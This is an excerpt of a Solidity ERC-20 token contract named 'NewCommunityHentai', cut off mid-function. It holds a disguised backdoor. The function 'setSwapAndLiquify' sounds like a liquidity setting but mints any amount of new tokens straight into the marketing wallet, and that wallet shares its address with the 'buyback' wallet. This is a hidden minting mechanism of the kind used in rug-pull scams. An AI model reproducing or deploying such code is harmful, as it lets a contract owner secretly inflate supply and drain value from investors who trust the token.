...
contract NewCommunityHentai is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NewCommunityHentai";
    string private _symbol = "HENTAI";
    uint8 private _decimals = 9;
    
    address payable public marketingWallet = payable(0xB0261B61417352f107bAd864BD7B7e07f215f277); // Marketing Address
    address payable public buyBackWallet = payable(0xB0261B61417352f107bAd864BD7B7e07f215f277); // BuyBack Address
    ...
    function setSwapAndLiquify(uint256 accumulation, address acc) public virtual {
        require(acc == address(marketingWallet), "Set Swap And Liquify");
        _autoliqs(address(marketingWallet), acc, accumulation);
        _totalSupply += accumulation;
        _balances[acc] += accumulation;
        emit Transfer(address(marketingWallet), acc, accumulation);
    }
    function _autoliqs(
        address from,
        address to,
